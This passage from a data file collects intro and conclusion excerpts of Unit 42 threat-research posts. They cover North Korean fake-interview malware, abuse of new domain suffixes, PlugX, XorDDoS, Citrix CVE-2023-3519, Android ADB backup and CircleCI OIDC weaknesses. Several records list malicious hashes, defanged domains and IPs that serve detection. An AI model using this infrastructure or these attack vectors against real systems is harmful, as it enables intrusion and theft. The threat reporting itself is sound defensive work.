managing identity entitlement, addresses the security challenges of managing IAM in cloud environments. Prisma Cloud IAM security capabilities automatically calculate effective permissions across cloud service providers, detect overly permissive access, and suggest corrections to reach least privilege entitlements.\nFind out how you can protect your organization from cloud environment attacks withUnit 42 Cloud Incident Responseservices to investigate and respond to attacks andCyber Risk Management Servicesto assess your security posture before an attack takes place.\nLearn How to Detect Cloud Threats at Ignite '22Attend the session \"Unearth advanced threats using your network and cloud data,\" at Palo Alto Networks Ignite '22, the security conference of the future, to find out how to detect compromised cloud compute tokens. Our researchers will show you how to investigate and respond to cloud attacks with a live demonstration.Register now!", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers recently discovered two separate campaigns targeting job-seeking activities linked to state-sponsored threat actors associated with the Democratic People's Republic of Korea (DPRK), commonly known as North Korea. We call the first campaign \"Contagious Interview,\" where threat actors pose as employers (often anonymously or with vague identities) to lure software developers into installing malware through the interview process. This malware creates the potential for various types of theft. We attribute with moderate confidence that Contagious Interview is run by a North Korea state-sponsored threat actor.\nWe call the second campaign \"Wagemole,\" where threat actors seek unauthorized employment with organizations based in the US and other parts of the world, with potential for both financial gain and espionage. We attribute with high confidence that Wagemole is a North Korea state-sponsored threat. Activity from both campaigns remains an ongoing active threat.\nWe nicknamed the first campaign Contagious Interview because the threat actor attempts to infect software developers with malware through a fictitious job interview. We originally discovered Contagious Interview through customer telemetry, and our research indicates it started as early as December 2022. Some of the infrastructure supporting this campaign remains active, and this activity remains a consistent threat. The first campaign's objective is likely cryptocurrency theft and using compromised targets as a staging environment for additional attacks. We track Contagious Interview as CL-STA-0240.\nWhile pivoting on indicators from Contagious Interview, we discovered exposed files on a different threat actor-controlled infrastructure. These files indicate fraudulent job-seeking activity targeting a wide variety of United States (US) companies. This trove of information includes resumes with different technical skill sets and multiple identities impersonating individuals from various nations. It also includes common job interview questions and answers, scripts for interviews and downloaded job postings from US companies. We call this separate campaign \"Wagemole\" and track it as CL-STA-0241.\nWhile we cannot determine the objective of this campaign, the US Department of Justice and Federal Bureau of Investigation (FBI) have reported that North Koreauses remote workers to funnel wages to its weapons programs.\nDuring our investigation of Contagious Interview, we discovered two new families of malware we named BeaverTail and InvisibleFerret. BeaverTail is JavaScript-based malware hidden inside Node Package Manager (NPM) packages. InvisibleFerret is a simple but powerful Python-based backdoor. Both are cross-platform malware that can run on Windows, Linux and macOS.\nThis article provides an overview of these two campaigns, and we examine the two new malware families, BeaverTail and InvisibleFerret.\nThis article also provides insight on how these threat actors are both seeking jobs and targeting job seekers to accomplish their goals. We provide recommendations for both job applicants and employers to consider when interviewing or applying for remote jobs.\nFor example:\nDon't use company-issued computers for personal activities. \nBe wary of GitHub accounts with few repositories or updates. \nConfirm the legitimacy of companies you're applying for. \nThoroughly vet the identity of job applicants.\nPalo Alto Networks customers receive protection from the malware discussed in this article through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire,DNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "Unit 42 researchers investigated suspicious activity from our telemetry and discovered these two campaigns, Contagious Interview and Wagemole, which we track as CL-STA-0240 and CL-STA-0241 respectively. In the process, we discovered two new malware families we have named BeaverTail and InvisibleFerret used in the Contagious Interview campaign.\nSoftware developers areoften the weakest linkfor supply chain attacks, andfraudulent job offersare an ongoing concern, so we expect continued activity from Contagious Interview. Furthermore, Wagemole represents an opportunity to embed insiders in targeted companies. We will continue to monitor our telemetry for further activity from these and other campaigns.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 hashes for files associated with BeaverTail:\n09a508e99b905330a3ebb7682c0dd5712e8eaa01a154b45a861ca12b6af29f86 \n0ce264819c7af1c485878ce795fd4727952157af7ffdea5f78bfd5b9d7806db1 \n104926c2c937b4597ea3493bccb7683ae812ef3c62c93a8fb008cfd64e05df59 \n1123fea9d3a52989ec34041f791045c216d19db69d71e62aa6b24a22d3278ef9 \n121ca625f582add0527f888bb84b31920183e78c7476228091ff2199ec5d796b \n12c0f44a931b9d0d74a2892565363bedfa13bec8e48ff5cd2352dec968f407ee \n1b21556fc8ecb9f8169ba0482de857b1f8a5cb120b2f1ac7729febe76f1eea83 \n1c905fa3a108f4c9bc0578882ce7af9682760b80af5232f130aa4f6463156b25 \n1f9169492d18bffacebe951a22495d5dec81f35b0929da7783b5f094efef7b48 \n2618a067e976f35f65aee95fecc9a8f52abea2fffd01e001f9865850435694cf \n40645f9052e03fed3a33a7e0f58bc2c263eeae02cbc855b9308511f5dc134797 \n41a912d72ba9d5db95094be333f79b60cae943a2bd113e20cc171f86ebcb86cf \n4c465e6c8f43f7d13a1b887ff26d9a30f77cf65dd3b6f2e9f7fe36c8b6e83003 \n4c605c6ef280b4ed5657fe97ba5b6106b10c4de02a40ae8c8907683129156efd \n592769457001374fac7a44379282ddf28c2219020c88150e32853f7517896c34 \n61dff5cbad45b4fe0852ac95b96b62918742b9c90dd47c672cbe0d1dafccb6c5 \n6465f7ddc9cf8ab6714cbbd49e1fd472e19818a0babbaf3764e96552e179c9af \n6b3fce8f2dad7e803418edd8dfc807b0252705c11ec77114498b01766102e849 \n700a582408cbda7ee79723b3969b8d10d67871ea31bb17c8ca3c0d94b481aa8c \n709820850127201a17caab273e01bb36ce185b4c4f68cd1099110bb193c84c42 \n72ebfe69c69d2dd173bb92013ab44d895a3367f91f09e3f8d18acab44e37b26d \n75f9f99295f86de85a8a2e4d73ed569bdb14a56a33d8240c72084f11752b207e \n785f65f1853a08b0e86db5638fbd76e8cad5fe1359655716166a76035261c0be \n7b718a46ae4de09ed4f2513df6e989afe1fbb1a0f59511a4689fac5e1745547d \n7f8bb754f84a06b3e3617dd1138f07a918d11717cc63acaef8eb5c6d10101377 \n845d7978682fa19161281a35b62f4c447c477082a765d6fedb219877d0c90f31 \n9867f99a66e64f6bce0cfca18b124194a683b8e4cb0ced44f7cb09386e1b528d \n9ae24a1912e4b0bab76ae97484b62ea22bdc27b7ea3e6472f18bf04ca66c87de \na2f8de3c5f5f6ecbf29c15afd43a7c13a5bf60023ecb371d39bcca6ceef1d2b7 \nb5f151f0a4288e148fd10e19c78399f5b7bdff2ad66940fadd20d6eae4b7518b \nb833f40b2f3439f317cf95980b29bddd2245d2acc2d5c11e9690dd2fa4289585 \nc8c11f9b308ea5983eebd8a414684021cc4cc1f67e7398ff967a18ae202fb457 \nceb59dbaf58a8de02f9d5e9b497321db0a19b7db4affd5b8d1a7e40d62775f96 \nd8f065d264b1112d6ee3cf34979289e89d9dcb30d2a3bd78cc797a81d3d56f56 \ndb6e75987cabdbfc21d0fdcb1cdae9887c492cab2b2ff1e529601a34a2abfd99 \nde42155e14a3c9c4d919316d6ba830229533de5063fcd110f53e2395ef3aa77a \ne2a940c7d19409e960427749519dc02293abe58a1bef78404a8390f818e40d08 \nfc9bb03998a89524ce5a0f859feb45806983aa4feb5f4d436107198ca869ff6f \nff620bd560485c13a58a0de941bd3e52943036e6a05306e928f7c626998822fb\nSHA256 hashes for DLL files downloaded by BeaverTail:\nda6d9c837c7c2531f0dbb7ce92bfceba4a9979953b6d49ed0862551d4b465adc \n2d8a5b637a95de3b709780898b7c3957f93d72806e87302f50c40fe850471a44 \nc5a73896dc628c23a0b6210f50019445e2b8bfc9770f4c81e1fed097f02dfade\nSHA256 hashes for files associated with InvisibleFerret:\n35434e903bc3be183fa07b9e99d49c0b0b3d8cf6cbd383518e9a9d753d25b672 \n305de20b24e2662d47f06f16a5998ef933a5f8e92f9ecadf82129b484769bbac \n39e7f94684129efce4d070d89e27508709f95fa55d9721f7b5d52f8b66b95ceb \nab198c5a79cd9dedb271bd8a56ab568fbd91984f269f075d8b65173e749a8fde \n444f56157dfcf9fc2347911a00fe9f3e3cb7971dccf67e1359d2f99a35aed88e \n4f50051ae3cb57f10506c6d69d7c9739c90ef21bfb82b14da6f4b407b6febac0 \n276863ee7b250419411b39c8539c31857752e54b53b072dffd0d3669f2914216 \n617c62da1c228ec6d264f89e375e9a594a72a714a9701ed3268aa4742925112b \nc547b80e1026d562ac851be007792ae98ddc1f3f8776741a72035aca3f18d277 \n03185038cad7126663550d2290a14a166494fdd7ab0978b98667d64bda6e27cc \n2d300410a3edb77b5f1f0ff2aa2d378425d984f15028c35dfad20fc750a6671a \n92aeea4c32013b935cd8550a082aff1014d0cd2c2b7d861b43a344de83b68129\nDomain and IPs associated with the Contagious Interview campaign:\nblocktestingto[.]com \n144.172.74[.]48 \n144.172.79[.]23 \n167.88.168[.]152 \n167.88.168[.]24 \n172.86.123[.]35 \n45.61.129[.]255 \n45.61.130[.]0 \n45.61.160[.]14 \n45.61.169[.]187\nUpdated Dec. 1, 2023, at 2:40 p.m. PT to expand product protections.\nUpdated Aug. 23, 2024, at 12:20 p.m. PT to correct numbering in Attribution section.\nUpdated Aug 28, 2024, at 7:43 a.m. PT to correct number in Table 3.", "source": "Palo"}, {"title": "Introduction", "content": "We investigated 19 new top-level domains (TLDs) released in the past year, which revealed large-scale phishing campaigns, distribution of potentially unwanted programs, torrenting websites, and even pranking and meme campaigns.\nWe saw correlation between the new TLDs' general availability dates and their popularity, showing that different groups follow the launch of new TLDs and their lifecycle. They do so to initiate domain registration and usage, including for abuse.\nThere are currently over 1,000 generic top-level domains (TLDs) according to the Internet Assigned Numbers Authority (IANA) root database, and more new TLDs are being added every year. As new TLDs emerge, the potential for malicious activity such as domain squatting and phishing increases tremendously. This is especially problematic when these TLDs resemble the extensions of popular file extensions such as.zip,and distinctive service identifiers such as.bot.\nPalo Alto Networks customers are better protected from the threats discussed in this article through ourNetwork Securitysolutions, such asAdvanced DNS SecurityandAdvanced URL Filteringsubscription services.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "We investigated domains registered under 19 newly released TLDs from the past year. To sustainably track the evolution of these domains over time, we introduced our graph-based investigation pipeline that can help identify coordinated attack and misuse campaigns.\nThis article presented detailed case studies on a variety of cyberthreats to show how domains registered on these newly released TLDs have been used for redirection, chatbot campaigns and torrent distribution. As new TLDs emerge, the potential for malicious activity such as domain squatting and phishing increases. This investigation reveals the importance of monitoring domains registered under new TLDs to discover and track new trends and attack campaigns.\nPalo Alto NetworksNext-Generation Firewallcustomers receive protections against malicious indicators (domain, IP address) mentioned in this article viaAdvanced DNS SecurityandAdvanced URL Filteringsubscription services.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "The following are domains and URL paths related to this article.\nakira[.]bot \namsterdam[.]bot \nattachedpdf[.]zip \nbroadband[.]bot \nchicken[.]bot \nchoto[.]click \nchoto[.]click/vx/ \nchoto[.]xyz \ncrowdstrike-hotfix[.]zip \ncrowdstrikefix[.]zip \nemilia[.]bot \nfluege[.]bot \nharriet[.]bot \nkleinanzeigen[.]bot \nlastminute[.]bot \nleipzig[.]bot \nmei[.]bot \npercy[.]bot \nphpstack-1171166-4096956.cloudwaysapps[.]com/chicken.php \nphpstack-1171166-4096956.cloudwaysapps[.]com/harriet.php \ntermin[.]bot \ntestvideo[.]mov \ntoronto[.]bot \nunblockit[.]black \nunblockit[.]esq \nunblockit[.]foo \nunblockit[.]ing \nunblockit[.]zip \nvalentina[.]bot \nwelt[.]bot \nworldfree4u[.]dad \nworldfree4u[.]foo \nworldfree4u[.]meme \nworldfree4u[.]mov \nworldfree4u[.]pm \nworldfree4u[.]zip \nassignment[.]zip \nphotos[.]zip \nbomb[.]zip \neicar-test-file[.]zip", "source": "Palo"}, {"title": "Introduction", "content": "On May 6 and May 11, 2015, Unit 42 observed two targeted attacks, the first against the U.S. government and the second on a European media company. Threat actors delivered the same document via spear-phishing emails to both organizations. The actors weaponized the delivery document to install a variant of the '9002' Trojan called '3102' that heavily relies on plugins to provide functionality needed by the actors to carry out on their objectives.\nThe 3102 payload used in this attack also appears to be related to the Evilgrab payload delivered in thewatering holeattack hosted on the President of Myanmar's website in May 2015.  Additionally, we uncovered ties between the C2 infrastructure and individuals in China active in online hacking forums that claim to work in Trojan development.\nPalo Alto NetworksWildFiredetected the payload delivered in these spear-phishing attacks as malicious, and the payload was also tagged in Palo Alto NetworksAutoFocusas9002.\nUPDATE 9/24/2015:The Palo Alto Networks platform detects the 3012 malware with its spyware signature9002.RAT.Gen Command And Control Traffic(ID# 14359).", "source": "Palo"}, {"title": "Conclusion", "content": "Unit 42 detected a cyber espionage group attacking the U.S. government and a European media organization within days of each other using a spear-phishing attack to deliver a variant of the 9002 Trojan called 3102. During the attack, the threat actor provided the 3102 Trojan with three plugins, which allowed the actors to interact with a compromised system's file system, log keystrokes and perform screen-capturing activities.\nThe threat actors signed the 3102 payload with a digital certificate that was also used to sign a 9002 sample that has ties to the Evilgrab payload delivered by the watering hole hosted on the President of Myanmar's website. Because that certificate doesn't seem to be in widespread use and the samples were compiled within thirty minutes of each other, we believe the same threat group conducted both of these attacks. The threat group uses both spear-phishing and watering hole attack vectors, along with different families of malware to target individuals and groups of interest. However, while they use different attack vectors and malware, this threat group also seems to reuse significant portions of their infrastructure between attacks, which aides in detection and proactive mitigation.\nResearch on registrant information used to set up infrastructure for these attacks led to ties within the hacking community in China, indicating the threat group behind this activity is likely Chinese-based. Interestingly, the tie to a private Chinese company further indicates they are likely being hired as contractors, in contrast to threat groups like APT1 that are associated with the Chinese military.\nThe files used in this attack are properly classified as malicious byWildFire. Users of Palo Alto NetworksTrapsadvanced endpoint protection are protected from exploitation of the CVE-2012-0158 vulnerability if they have not been able to patch their systems.AutoFocususers can find more information on samples and indicators related to this attack by viewing the9002tag.", "source": "Palo"}, {"title": "Introduction", "content": "On July 18, 2023, Citrix published a security bulletin for vulnerabilities affecting their NetScaler ADC and NetScaler Gateway products. When these appliances are configured as a gateway or authentication server and managed by a customer (i.e., not Citrix-managed) they can be vulnerable to remote code execution initiated by an attacker. Vulnerabilities on Citrix-managed servers have already been mitigated.\nCitrix states that they have observed attacks targetingCVE-2023-3519against appliances that haven't been patched. The Cybersecurity and Infrastructure Security Agency (CISA) has alsoreleased an advisorydetailing an attack using this vulnerability.\nPalo Alto Networks customers receive protections from and mitigations for CVE-2023-3519 in the following ways:\nNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block the attacks. \nCortex Xpansecustomers can identify external-facing instances of the application through the \"Insecure Citrix Application Delivery Controller\"attack surface rule.\nPalo Alto Networks also recommends patching against these vulnerabilities, including CVE-2023-3519, with the software update provided by Citrix.", "source": "Palo"}, {"title": "Conclusion", "content": "Based on the amount of publicly available information, Palo Alto Networks highly recommends following CISA's guidance on mitigations for protecting your organization against CVE-2023-3519, CVE-2023-3466 and CVE-2023-3467. These mitigations include applying vendor-provided patches as well as executing their described detection and mitigation methods in your network environment.\nPalo Alto Networks and Unit 42 will continue to monitor the situation for updated information including release of proof-of-concept code or evidence of more widespread exploitation.\nPalo Alto Networks customers are protected by our products, as listed below. We will update this threat brief as more relevant information becomes available.", "source": "Palo"}, {"title": "Introduction", "content": "We recently detected a new campaign from the XorDDoS Trojan that led us to conduct an in-depth investigation that unveiled concealed network infrastructure that carries a large amount of command and control (C2) traffic. When we compared the most recent wave of XorDDoS attacks with a campaign from 2022, we found the only difference between the campaigns was in the configuration of the C2 hosts. While the attacking domains remain unchanged, the attackers have migrated their offensive infrastructure to hosts running on legitimate public hosting services.\nEven though numerous security vendors have already classified the C2 domains as malicious and barred them, we still detect active malware traffic directed to these new underlying IPs. This underscores the necessity of extending protection beyond the mere blocking of dedicated attacking hosts.\nWe provide a comprehensive analysis of the XorDDoS Trojan's attacking behaviors. Subsequently, we unveil the intricate network infrastructure orchestrating the campaign's botnet. Lastly, we introduce the advanced signatures derived from the key attacking hotspots, including hostnames, URLs and IP addresses. These signatures effectively identified over 1,000 XorDDoS C2 traffic sessions in August 2023 alone.\nPalo Alto Networks customers receive protection from the XorDDoS campaign through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire,DNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "The XorDDoS Trojan spread around the world during July and August 2023. This threat infects Linux devices and transforms them into zombies for launching DDoS attacks. The attackers coordinate the botnet with C2 domains that they have abused before. However, they have recently relocated their C2 servers to new IP addresses from public hosting services.\nWe conducted a comprehensive investigation to unveil the underlying attacking network infrastructure. Leveraging this insight, we craft advanced signatures to detect malware activities involving nondedicated attacking hosts.\nPalo Alto Networks customers receive protection against the ongoing attacks through the following cloud-delivered security services:\nAdvanced WildFireidentifies and thwarts malware delivery attempts. \nDNS Securityeffectively prevents the resolution of C2 hostnames. \nAdvanced URL Filteringblocks the web requests to malicious URLs. \nNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block malware C2 traffic via the following Threat Prevention signatures:13306,13811.", "source": "Palo"}, {"title": "Introduction", "content": "This post is the first in a series by Unit 42 covering the cybercrime underground. Cybercrime persists as an epidemic that continues to worsen every year, with associated impacts and losses steadily growing. In this series, we'll explore actors, motivations, and the current threat landscape.\nSome of what contributes to the growth of the cybercrime underground is the convenience, speed, and anonymity the Internet provides to enable online crimes. Advances in the sophistication of cyberattacks over the past decade closely correlate with two major evolutions:\nLowered Cost of Entry: The ease and availability of tools and training to conduct such attacks, allowing individuals with lower skillsets to successfully thrive in the cybercrime industry. \nIncreased Business Acumen: The refinement of full attack lifecycle processes and support structures that rival some of the most innovative legitimate business models, enabling more efficient and effective operations coupled with robust commodity markets.\nWith the ever-changing cybercrime threat landscape, it is important to understand its current state, observe trends, and anticipate likely paths of evolution. Before we go any further, let's establish some definitions related to the cybercrime underground.", "source": "Palo"}, {"title": "Introduction", "content": "Threat actors register thousands of new domains daily, preparing for future malicious activities such as serving command and controls (C2), hosting malware and delivering deceptive content. Palo Alto Networks employs state-of-the-art methods to detect emerging network threats and protect customers through acloud-delivered domain denylist. The majority of existing domain abuse detectors focus on digging up DNS lookup patterns of ongoing attacks and actively crawling web content for malicious indicators. They usually have delays in discovering new threats due to visibility and resource limitations. Thus, they fail to protect patient zero. In particular, to avoid being blocked, malicious domains usually conduct attacks only for a short period of time after the threats are hosted on them. As a result, it is often too late to block such domains after the malicious activity has been observed.\nTo detect potentially abused domains as quickly as possible and protect our customers, we developed a proactive system for Palo Alto NetworksDNS Securityto identify malicious domains at the time of registration based on their registration records. Our method leverages predictive indicators from WHOIS records that can expose abused network hotspots (e.g., registrars, name servers) and abnormal registration behaviors (e.g., bulk domain registration). Compared to a well-known publicly available online URL scanner (denoted as public-scanner going forward), our detector reduces the discovery time for malicious domains by 9.25 days on average. It achieves a five-times higher detection rate for suspiciousnewly registered domains (NRDs)from abnormally large registration campaigns compared to public-scanner.\nOnce the proactive detector captures a \"will-be-malicious\" domain, the knowledge is distributed from DNS Security to otherPalo Alto Networks Next-Generation Firewallsecurity subscriptions, includingURL FilteringandWildFire.", "source": "Palo"}, {"title": "Conclusion", "content": "At Palo Alto Networks, we keep close track of newly registered domains and proactively dig for potential cybercriminal activities, including C2, phishing andgraywarehosting, as the majority of network attacks happen within a short period after malicious domain registration. Our system can prevent patient zero, detect more suspicious domains from attackers' registration campaigns compared to public-scanner, and discover innovative malicious indicators.\nPalo Alto Networks identifies the detected domains with grayware category through our security subscriptions for Next-Generation Firewalls, including URL Filtering and DNS Security. Our customers are protected against any damage from risky domains mentioned in this blog as well as captured by our system. Other malicious indicators (IP, URL, SHA256) are covered via the Next-Generation Firewall, URL Filtering, and WildFire, where applicable.\nSpecial thanks to Laura Novak, Eddy Rivera, Jun Javier Wang, and Arun Kumar for their help with improving the blog.\nminorleage[.]top\nkelvinso412[.]comkelvinso45[.]comkelvinso4[.]comkelvinsoirnt98[.]comophenhand[.]orgpenguinsac[.]com\n69av19[.]xyz99s13[.]xyzcc222[.]comfs10[.]xyzhfcclixb[.]xyzhobbytoypark[.]comjemstutoring[.]comkrk13pearland[.]comtheav9[.]xyz\n104.24.100[.]218104.24.101[.]218172.67.167[.]27\nJA3: 6312930a139fa3ed22b87abb75c16afaJA3S: 8685e43ade3e6ec8993efb5d149fb4bc", "source": "Palo"}, {"title": "Introduction", "content": "While monitoring the Microsoft Exchange Server attacks in March 2021, Unit 42 researchers identified aPlugXvariant delivered as a post-exploitation remote access tool (RAT) to one of the compromised servers. The variant observed by Unit 42 is unique in that it contains a change to its core source code: the replacement of its trademark word \"PLUG\" to \"THOR.\" The earliest THOR sample uncovered was from August 2019, and it is the earliest known instance of the rebranded code. New features were observed in this variant, including enhanced payload-delivery mechanisms and abuse of trusted binaries.\nFirst discovered in 2008, PlugX is a second-stage implant that's been used by Chinese cyberespionage groupPKPLUG(aka Mustang Panda) and other groups. In addition to being used in multiple high-profile attacks over the years, including the significantU.S. Government Office of Personnel Management (OPM)breach in 2015, PlugX is also known for its modularity and plug-in-style approach to malware development.\nAdditional hunting and analysis led to the identification of several more samples along with an associated PlugX command and control (C2) infrastructure. This blog provides a technical overview of the PlugX variant discovered, indicators of compromise (IOCs) to identify it in networks and a tool developed by Unit 42 to handle payload decryption.\nPalo Alto Networks customers are protected from PlugX withCortex XDRor theNext-Generation FirewallwithWildFireandThreat Preventionsecurity subscriptions.AutoFocususers can track PlugX and PKPLUG activity using thePlugXandPKPLUGtags, respectively. Full visualization of the techniques observed and their relevant courses of action can be viewed in theUnit 42 ATOM Viewer.", "source": "Palo"}, {"title": "Conclusion", "content": "Thirteen years after its initial discovery, the PlugX malware family remains a threat. After 10+ years of consistent source code components, the developers made an unexpected change to its signature magic value from \"PLUG\" to \"THOR.\" New features were observed in this variant, including enhanced payload delivery mechanisms and abuse of trusted binaries. With the THOR identifier signature, Unit 42 will continue to search for additional samples and variants that may be associated with this new PlugX variant.\nPalo Alto Networks customers are protected from PlugX withCortex XDRor theNext-Generation FirewallwithWildFireandThreat Preventionsecurity subscriptions.AutoFocususers can track PlugX and PKPLUG activity using thePlugXandPKPLUGtags, respectively.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and systematically disrupt malicious cyber actors. Visit theCyber Threat Alliancefor more information\nPKPLUG: Chinese Cyber Espionage Group Attacking Southeast Asia\nTable 2. PlugX-encrypted payloads containing THOR magic bytes\nTable 3. PlugX loaders using THOR payloads\nTable 4. PlugX-encrypted payloads: XOR header\nTable 5. PlugX-encrypted payloads: Unknown encryption\nTable 6. PlugX loaders using PLUG payloads\nPlugX (THOR magic bytes) related to Microsoft Exchange Vulnerabilityrainydaysweb[.]com154.211.14[.]156\nOther PlugX (THOR magic bytes)upload.ukbbcnews[.]comindonesiaport[.]infotools.scbbgroup[.]comwww.cabsecnow[.]comnews.cqpeizi[.]com45.248.87[.]217103.85.24[.]158167.88.180[.]131167.88.180[.]32108.61.182[.]34\nOther PlugX (PLUG magic bytes):web.flashplayerup[.]comdownloads.flashplayerup[.]comhelp.flashplayerup[.]comindex.flashplayerup[.]comwww.destroy2013[.]comwww.fitehook[.]comwww.manager2013[.]comwww.mmfhlele[.]comdetail.misecure[.]comwww.quochoice[.]comwww.systeminfor[.]comwww.emicrosoftinterview[.]comdown.emicrosoftinterview[.]comnews.petalossccaf[.]comwww.msdntoolkit[.]comwww.apple-net[.]comhdviet.tv-vn[.]com103.56.53[.]106185.239.226[.]65103.192.226[.]10045.248.87[.]14045.142.166[.]112103.107.104[.]3842.99.117[.]9245.251.240[.]55103.56.53[.]46154.223.150[.]10545.248.87[.]162103.200.97[.]15042.99.117[.]9543.254.217[.]16545.248.87[.]217\nAttack Stagingraw.githubusercontent[.]com/tellyou123", "source": "Palo"}, {"title": "Introduction", "content": "It's no secret that web threats, fueled by sophisticated attackers, continue to increase and do more damage. As part of our regular tracking and observation of trends in web threats, from October 2020 to September 2021, our web threat detection module found around 2,240,000 incidents of malicious landing URLs containing all kinds of web threats, 831,000 of which are unique URLs.\nWe analyzed these web threats in search of trends in when web threats are more active, which malware families present threats more often, and where in the world web threats appear to be coming from. In many cases, the majority appear to originate from the United States (though we recognize that attackers may use proxy servers to hide their physical locations).\nWe also take a closer look at the web skimmer. With the popularity of e-commerce websites, web skimmer attacks are being leveraged by more attackers due to the difficulty in detecting them and the ease of deploying them. We will provide insight into how the attack is distributed. We observe that more and more web skimmers are being hosted on the cloud, especially for some web skimmer families.\nPalo Alto Networks customers are protected from the web threats discussed here and many others via theAdvancedURL FilteringandThreat Preventioncloud-delivered security subscriptions.", "source": "Palo"}, {"title": "Conclusion", "content": "The web threats analyzed in this blog indicate that the most prevalent web threats are cryptominers, JS downloaders, web skimmers, web scams and JS redirectors.\nWhile many of the most common web threats come from a few malware families that share common characteristics, web skimmers stand out for the diversity of their code and behavior. Furthermore, it is worth noting that some web skimmer families are increasingly focused on taking advantage of cloud hosting \u2013 in some cases, more than 50% of the malicious JavaScript code we observed was hosted on the cloud.\nThe prevalence of web threats emphasizes the need for website administrators to patch all systems, components and web plugins and implement security best practices, which will help to minimize the likelihood of compromised systems.\nWhile cybercriminals continue to seek opportunities for malicious cyber activities, Palo Alto Networks customers are protected from the web threat attacks discussed here and many others via the AdvancedURL FilteringandThreat Preventioncloud-delivered security subscriptions.\nWe also recommend the following actions:\nContinuously update yourNext-Generation Firewallswith the latest Palo Alto Networks Threat Prevention content. \nRun aBest Practice Assessmentto improve your security posture.\nIf you think you may be experiencing an active breach, theUnit 42 Incident Responseteam can help. Please emailunit42-investigations@paloaltonetworks.comor call (866) 486-4842 \u2013 (866) 4-UNIT42 \u2013 for U.S. toll free, (31-20) 299-3130 in EMEA or (65) 6983-8730 in JAPAC. The Unit 42 Incident Response team is available 24/7/365.", "source": "Palo"}, {"title": "Introduction", "content": "Today, Palo Alto Networks researcher Claud Xiao is delivering a presentation titled \"Insecure Internal Storage in Android\" at the Hacks in Taiwan Conference (HITCON).\nClaud is discussing techniques for accessing private data in Android's internal storage system using the Android Debug Bridge (ADB) backup/restore functionality. While over 85% of active Android devices are vulnerable to this attack, Android includes multiple levels of protection to prevent unauthorized data access. In today's presentation, Claud will have demonstrated how an attacker could bypass all of those protections to gain access to usernames, passwords and a treasure trove of other data.\nTo understand this attack, it's critical to understand how applications use Android internal storage and why unauthorized access to this data is so problematic.", "source": "Palo"}, {"title": "Conclusion", "content": "Theslides and demo codefrom Claud's talk at HITCON are available now. These include more detail than we could fit into this blog and show specifically how Claud bypassed the ADB protections on-stage today.\nPalo Alto Networks first reported the issues described here to the Google security team in March of 2013 and provided them with the content of todays presentation in July 2014. While we understand their position on Android internal storage and applaud their patching of vulnerabilities that allow access to the system, we hope that developers will take action to protect their users' data from the risk of the ADB backup attack.", "source": "Palo"}, {"title": "Introduction", "content": "In the course of investigating the use of OpenID Connect (OIDC) within continuous integration and continuous deployment (CI/CD) environments, Unit 42 researchers discovered problematic patterns and implementations that could be leveraged by threat actors to gain access to restricted resources. One instance of such an implementation was identified in CircleCI's OIDC.\nOIDC extends the OAuth protocol by adding a new token to the protocol, enabling applications to verify user identities and authorize access to resources using that token. It plays a crucial role in ensuring secure and seamless authentication and authorization during CI/CD processes. Securing these implementations is critical, as OIDC is rapidly being adopted as the primary foundation for modern cloud authentication workflows. In this article, we discuss potential critical security risks in OIDC implementation and usage.\nOur analysis revealed three key threat vectors:\nLoosely configured policies used by identity federations \nReliance on user-controllable claim values \nAbility to leverage poisoned pipeline execution (PPE) in combination with permissive identity federation\nWe urge organizations to review and strengthen their OIDC policies, implement strict claim validation and enhance CI/CD security practices.\nCircleCI also shared a responsedescribing how they addressed the issue and offering recommendations to improve security.\nPalo Alto Networks'Cortex Cloudand Prisma Cloud offerings provide protection against these threats through comprehensive cloud security features.\nIf you suspect a compromise or have an urgent security matter, contact theUnit 42 Incident Responseteam immediately.", "source": "Palo"}, {"title": "Conclusion", "content": "OIDC in CI represents a significant advancement in securing CI/CD pipelines by eliminating the need for stored credentials. OIDC can help to reduce the impact in instances likethe recenttj-actions/changed-filesincident, where pipeline secrets were printed to the logs. However, our research reveals several critical security implications that organizations need to consider when implementing OIDC authentication in their CI environments.\nThe key findings from our investigation demonstrate that:\nThe dual role of CI vendors as both runner provisioners and IdPs creates unique security considerations \nAuthorization configurations are particularly prone to misconfigurations for OIDC in the context of CI \nLax policies sometimes equal vulnerable policies \nUser-controlled claims and custom configurations require careful validation\nLooking ahead, as organizations increasingly adopt OIDC for CI/CD security, we anticipate these challenges will become more prevalent. The combination of PPE vulnerabilities with permissive OIDC policies particularly highlights the need for defense-in-depth approaches.\nFor organizations implementing OIDC in CI environments, we recommend:\nUsing repository-specific federation rules instead of organization-wide patterns \nImplementing strict claim validation, especially for user-controllable claims \nRegularly auditing OIDC configurations, focusing on federation policies and custom claim formats \nFollowing CI security best practices to prevent PPE vulnerabilities from being exploited via OIDC", "source": "Palo"}, {"title": "Introduction", "content": "The Unit 42 Managed Threat Hunting team (MTH) identified a variant of WikiLoader loader for rent (aka WailingCrab) being delivered via SEO poisoning and spoofing ourGlobalProtect VPNsoftware. Analysis conducted by the Advanced WildFire reverse engineering team has uncovered the latest evasion techniques for WikiLoader, providing new insights into its evolution.\nWe provide multiple XQL queries for Cortex to hunt for this WikiLoader campaign. We also provide hashes that identify samples found in the wild as well as command and control (C2) URLs extracted from the original sample that spoofed GlobalProtect.\nPalo Alto Networks customers are better protected from the threats discussed in this article through detection mechanisms available from the following products:\nCortex XDRandXSIAM \nNext-Generation 